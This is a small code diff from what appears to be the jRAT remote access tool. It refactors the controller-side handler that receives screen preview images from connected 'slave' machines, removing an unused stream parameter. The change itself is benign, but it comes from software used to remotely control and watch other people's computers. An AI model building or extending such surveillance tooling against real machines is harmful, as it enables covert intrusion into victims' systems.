@@ -5,12 +5,11 @@ import jrat.controller.Slave;
 import jrat.controller.ui.frames.FramePreviewImage;
 
 import java.awt.image.BufferedImage;
-import java.io.DataInputStream;
 
 public class Packet43PreviewImage extends AbstractIncomingPacket {
 
 	@Override
-	public void read(Slave slave, DataInputStream dis) throws Exception {
+	public void read(Slave slave) throws Exception {
 		FramePreviewImage frame = FramePreviewImage.INSTANCES.get(slave);
 		
 		int imageSize = slave.readInt();
